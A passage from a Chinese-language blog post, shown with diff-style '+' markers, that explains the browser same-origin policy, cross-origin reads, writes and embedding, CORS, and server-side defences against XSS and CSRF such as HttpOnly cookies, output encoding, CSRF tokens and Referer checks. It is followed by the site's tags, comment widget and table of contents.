+<p>我们这里需要强调同源策略是由浏览器制定的，用于保护存放在浏览器上的内容，比如相当重要的session cookie，我们知道可以利用 <code>document.cookie</code> 来获取当前页面的cookie，如果没有同源策略，那么黑客就可以通过注入JS脚本来获取用户存放与客户端的所有内容，也可以继续调用DOM的API进行DOM内容的修改以及访问，这是非常危险的。 <!-- raw HTML omitted --></p>
+<h4 id="definition-of-an-origin-同源的概念">Definition of an origin 同源的概念</h4>
+<p>两个URLs如果被称为同源，他们必须要保证协议(http/https),端口（如果被指定了的话）一致，访问资源的路径不一样没有关系 <!-- raw HTML omitted --></p>
+<p>我们通过一个例子来解释 <!-- raw HTML omitted --></p>
+<p>针对URL： <code>http://store.company.com/dir/page.html</code> <!-- raw HTML omitted --></p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>URL</th>
+<th>类别</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a class="link" href="http://store.company.com/dir2/other.html"  target="_blank" rel="noopener"
+    >http://store.company.com/dir2/other.html</a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link" href="http://store.company.com/dir/inner/another.html"  target="_blank" rel="noopener"
+    >http://store.company.com/dir/inner/another.html</a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link" href="https://store.company.com/page.html"  target="_blank" rel="noopener"
+    >https://store.company.com/page.html</a></td>
+<td>不同源</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a class="link" href="http://store.company.com:81/dir/page.html"  target="_blank" rel="noopener"
+    >http://store.company.com:81/dir/page.html</a></td>
+<td>不同源</td>
+<td>端口号不同</td>
+</tr>
+<tr>
+<td><a class="link" href="http://news.company.com/dir/page.html"  target="_blank" rel="noopener"
+    >http://news.company.com/dir/page.html</a></td>
+<td>不同源</td>
+<td>Host不同</td>
+</tr>
+</tbody>
+</table></div>
+<h4 id="跨站网络访问">跨站网络访问</h4>
+<p>不同源的网页之间进行交互的方式一般由三种： <!-- raw HTML omitted --></p>
+<ol>
+<li>Cross-origin writes 跨站写操作：一般来说是被允许的。比如页面中的链接（links），重定向以及表单提交 <!-- raw HTML omitted --></li>
+<li>Cross-origin embedding 跨站资源嵌入：一般来说也是被允许的 <!-- raw HTML omitted --></li>
+<li>Cross-origin reads 跨站读操作：一般来说是不被允许的，即从一个网页向另一个网页直接获取数据 <!-- raw HTML omitted --></li>
+</ol>
+<p>跨站资源嵌入的一些例子： <!-- raw HTML omitted --></p>
+<ul>
+<li>&lt;script src=&rdquo;&hellip;&quot;&gt;&lt;/script&gt; 标签嵌入跨站脚本。语法错误信息只能被同源脚本中捕捉到。 <!-- raw HTML omitted --></li>
+<li>&lt;link rel=&ldquo;stylesheet&rdquo; href=&quot;&hellip;&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨站需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 <!-- raw HTML omitted --></li>
+<li>通过 &lt;img&gt; 展示的图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,&hellip; <!-- raw HTML omitted --></li>
+<li>通过 &lt;video&gt; 和 &lt;audio&gt; 播放的多媒体资源。 <!-- raw HTML omitted --></li>
+<li>通过 &lt;object&gt;、 &lt;embed&gt; 和 &lt;applet&gt; 嵌入的插件。 <!-- raw HTML omitted --></li>
+<li>通过 @font-face 引入的字体。一些浏览器允许跨站字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。 <!-- raw HTML omitted --></li>
+<li>通过 &lt;iframe&gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨站交互。 <!-- raw HTML omitted --></li>
+</ul>
+<h4 id="如何允许跨站访问">如何允许跨站访问</h4>
+<p>可以通过由服务端发回的HTTP响应中，添加 <code>CORS</code> field来指定那些host可以加载资源 <!-- raw HTML omitted --></p>
+<h4 id="如何阻止跨站访问">如何阻止跨站访问</h4>
+<ul>
+<li>阻止跨站写操作，只要检测请求中的一个不可推测的标记(CSRF token)即可，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。你必须使用这个标记来阻止页面的跨站读操作。 <!-- raw HTML omitted --></li>
+<li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。 <!-- raw HTML omitted --></li>
+<li>阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。浏览器可能不会遵守 Content-Type 头部定义的类型。例如，如果您在HTML文档中指定 &lt;script&gt; 标记，则浏览器将尝试将标签内部的 HTML 解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。 <!-- raw HTML omitted --></li>
+</ul>
+<h4 id="跨站数据存储访问">跨站数据存储访问</h4>
+<p>Cookies  使用不同的源定义方式。一个页面可以为本域和其父域设置 cookie，只要是父域不是公共后缀（public suffix）即可。Firefox 和 Chrome 使用 Public Suffix List 检测一个域是否是公共后缀（public suffix）。 <!-- raw HTML omitted --></p>
+<h3 id="countermeasure-如何防范针对web客户端的攻击">Countermeasure 如何防范针对WEB客户端的攻击</h3>
+<p>我们可以将主要的对策分为两种 <!-- raw HTML omitted --></p>
+<dl>
+<dt>客户端</dt>
+<dd>客户端的防御依赖于用户的安全意识以及一些浏览器还有插件的辅助 <!-- raw HTML omitted -->
+<ul>
+<li>尽量反问原始网站，不要访问那些后面带着很多GET参数的链接 <!-- raw HTML omitted --></li>
+<li>默认关闭JS来避免恶意代码的执行 <!-- raw HTML omitted --></li>
+<li>在访问比较敏感的网页的时候尽量不要访问其他的网站 <!-- raw HTML omitted --></li>
+<li>及时关闭重启浏览器 <!-- raw HTML omitted --></li>
+</ul>
+</dd>
+<dt>服务端</dt>
+<dd>XSS <!-- raw HTML omitted -->
+<ol>
+<li>
+<p>HttpOnly cookie: <!-- raw HTML omitted --></p>
+<p>服务端给一些重要的cookie设置 <code>HttpOnly</code> 属性，从而避免这些cookie被脚本语言所调用查看以及利用 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>Input validation 输入检查： <!-- raw HTML omitted --></p>
+<p>对于所有的用户输入我们都需要进行严格的检查以及过滤，组织一些恶意脚本的插入（e.g. htmlspecialchars() in php） <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>Output validation &amp; HTML encode 输出检查与HTML编码： <!-- raw HTML omitted --></p>
+<p>我们除了对用户发送过来的HTTP请求进行检查，还需要在返回HTML代码之前进行二次检查，因为可能在服务器端的脚本执行之后，一些恶意的代码被嵌入到了HTML代码中，因此我们可以通过例如 <code>HTML encode</code> 的方法将特殊字符全部转换为 <code>HTML entities</code> 来避免这样的情况发生 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>CSRF <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>Two-factor authentication (e.g.,验证码) <!-- raw HTML omitted --></p>
+<p>因为在CSRF中，往往在用户毫不知情的情况下就发生了针对用户账号的攻击，那么我们可以设置双重认证来保护那些重要的操作必须在用户的许可下才能执行 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>CSRF tokens <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>Referer检查 <!-- raw HTML omitted -->
+检查请求是否是通过合理的域名下跳转而来的，比如提交表单是由发帖页面跳转而来。 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+</dd>
+</dl>
+<h4 id="csrf-tokens">CSRF tokens</h4>
+<p>CSRF tokens是由服务端产生的，在用户登录之后在HTTP Response中发送给客户端，客户端将这个token存储在本地，例如添加一个隐藏的字段中 <!-- raw HTML omitted --></p>
+<p>当用户再次向服务器端发送请求的时候，服务器端就会检查token是否在HTTP header当中，从而预防CSRF <!-- raw HTML omitted --></p>
+<p>因为通过黑客的网站发出的请求，只能最多包含cookie的内容，却不能包含存在于原始页面中的隐藏token，导致访问失败 <!-- raw HTML omitted --></p>
+<h3 id="reference">Reference</h3>
+<p><a class="link" href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-1"  target="_blank" rel="noopener"
+    >XSS 从零开始</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://www.freebuf.com/articles/web/261158.html"  target="_blank" rel="noopener"
+    >Pikachu靶场通关之Cross-site request forgery</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE"  target="_blank" rel="noopener"
+    >Same-origin policy</a> <!-- raw HTML omitted --></p>
+<p>《白帽子讲web安全》 <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/xss/">xss</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 19, 2022 23:52 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/xss_challenge_trip/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XSS 挑战之旅</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/sqli_blind_injection/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：盲注</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/file_upload_ggctf_upload/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">File Upload: ggctf-upload</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#client-side-attacks-针对客户端的web攻击">Client-side Attacks 针对客户端的Web攻击</a>
+      <ul>
+        <li><a href="#prerequisite">Prerequisite</a>
+          <ul>
+            <li><a href="#cookie">Cookie</a></li>
+          </ul>
+        </li>
+        <li><a href="#client-side-attacks-goals-针对客户端的攻击的目标">Client-side Attacks Goals 针对客户端的攻击的目标</a></li>
+        <li><a href="#xss">XSS</a>
+          <ul>
+            <li><a href="#reflected-xss-反射型xss">Reflected XSS 反射型XSS</a></li>
+            <li><a href="#stored-xss-存储型-xss">Stored XSS 存储型 XSS</a></li>
+            <li><a href="#dom-based-xss">DOM-based XSS</a></li>
+            <li><a href="#xss的危害">XSS的危害</a></li>
+          </ul>
+        </li>
+        <li><a href="#csrf">CSRF</a></li>
+        <li><a href="#same-origin-policy-浏览器的同源策略">Same-origin policy 浏览器的同源策略</a>
+          <ul>
+            <li><a href="#definition-of-an-origin-同源的概念">Definition of an origin 同源的概念</a></li>
+            <li><a href="#跨站网络访问">跨站网络访问</a></li>
+            <li><a href="#如何允许跨站访问">如何允许跨站访问</a></li>
+            <li><a href="#如何阻止跨站访问">如何阻止跨站访问</a></li>
+            <li><a href="#跨站数据存储访问">跨站数据存储访问</a></li>
+          </ul>
+        </li>
+        <li><a href="#countermeasure-如何防范针对web客户端的攻击">Countermeasure 如何防范针对WEB客户端的攻击</a>
+          <ul>
+            <li><a href="#csrf-tokens">CSRF tokens</a></li>
+          </ul>
+        </li>
+        <li><a href="#reference">Reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
